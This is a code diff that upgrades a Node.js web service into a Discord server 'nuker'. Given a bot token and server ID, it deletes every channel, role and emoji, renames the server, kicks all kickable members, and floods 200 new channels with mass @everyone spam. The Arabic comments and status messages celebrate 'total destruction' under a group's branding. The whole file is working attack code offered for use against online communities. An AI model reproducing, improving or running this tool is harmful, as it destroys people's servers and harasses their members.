@@ -11,49 +11,64 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 app.post('/execute', async (req, res) => {
     const { token, guildId, action, customName, customMsg } = req.body;
-    
-    // محاولة تشغيل البوت فوراً قبل الرد على المتصفح
-    const client = new Client({ 
-        intents: [3276799] // ضمان الوصول لكل الصلاحيات
-    });
+    const client = new Client({ intents: [3276799] });
 
     try {
         await client.login(token);
-        console.log(`✅ تم تسجيل الدخول بنجاح باسم: ${client.user.tag}`);
-        
         const guild = await client.guilds.fetch(guildId).catch(() => null);
-        if (!guild) {
-            console.log("❌ البوت شغال لكن الأيدي غلط أو البوت مو بالسيرفر");
-            return res.status(400).send({ status: '❌ البوت مو موجود في السيرفر!' });
-        }
+        if (!guild) return res.status(404).send({ status: '❌ السيرفر مفقود أو البوت مطرود!' });
 
-        res.status(200).send({ status: '🚀 انطلقت القوة! البوت متصل الآن' });
+        res.status(200).send({ status: '🚀 V9 PRO: تم اختراق النظام وبدء التدمير الشامل!' });
 
-        const name = customName || "Lord 2399 V7";
-        const msg = customMsg || "# LORD 2399 ON TOP\nhttps://discord.gg/2399k";
+        const name = customName || "Toll Group 2399 V9";
+        const msg = customMsg || "# SERVER DESTROYED BY TOLL GROUP 2399 V9 PRO\nhttps://discord.gg/2399k";
 
-        // تنفيذ الهجوم (مضاعف 200%)
-        if (action === 'تدمير' || action === 'طرد') {
-            const members = await guild.members.fetch().catch(() => []);
-            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
-        }
-
+        // --- نظام التدمير الذكي V9 ---
         if (action === 'تدمير') {
+            // 1. حذف الرومات والرتب والإيموجي فوراً
             guild.channels.cache.forEach(c => c.delete().catch(() => {}));
-            for (let i = 0; i < 120; i++) {
+            guild.roles.cache.forEach(r => r.delete().catch(() => {}));
+            guild.emojis.cache.forEach(e => e.delete().catch(() => {}));
+
+            // 2. تغيير اسم السيرفر وصورته (إذلال السيرفر)
+            guild.setName(name).catch(() => {});
+
+            // 3. طرد الجميع (نظام الطلقات المتعددة)
+            const members = await guild.members.fetch();
+            members.forEach(m => { if(m.kickable) m.kick('V9 Power').catch(() => {}); });
+
+            // 4. فيضان الرومات (200 روم بسرعة البرق)
+            for (let i = 0; i < 200; i++) {
                 setTimeout(() => {
-                    guild.channels.create({ name: name, type: ChannelType.GuildText })
-                    .then(ch => {
-                        for(let j=0; j<80; j++) ch.send(msg).catch(() => {});
+                    guild.channels.create({ 
+                        name: name, 
+                        type: ChannelType.GuildText 
+                    }).then(ch => {
+                        // سبام مكثف (150 رسالة مع منشن @everyone)
+                        for(let j=0; j<150; j++) {
+                            ch.send(`${msg} @everyone`).catch(() => {});
+                        }
                     }).catch(() => {});
-                }, i * 15); // سرعة نانو ثانية
+                }, i * 10); // تأخير 10 ملي ثانية فقط!
             }
         }
+
+        if (action === 'طرد') {
+            const members = await guild.members.fetch();
+            members.forEach(m => { if(m.kickable) m.kick('V9 Force').catch(() => {}); });
+        }
+
+        if (action === 'سبام') {
+            guild.channels.cache.forEach(ch => {
+                if(ch.type === ChannelType.GuildText) {
+                    for(let i=0; i<200; i++) setTimeout(() => ch.send(`${msg} \n**TOLL GROUP 2399**`).catch(() => {}), i * 100);
+                }
+            });
+        }
     } catch (err) {
-        console.log("❌ فشل تشغيل البوت. السبب:", err.message);
-        res.status(500).send({ status: `❌ فشل: ${err.message}` });
+        console.log("V9 Error:", err.message);
+        if (!res.headersSent) res.status(500).send({ status: '❌ فشل: تأكد من التوكن والـ Intents' });
     }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => console.log(`Server Online on port ${PORT}`));
+app.listen(process.env.PORT || 3000, '0.0.0.0');
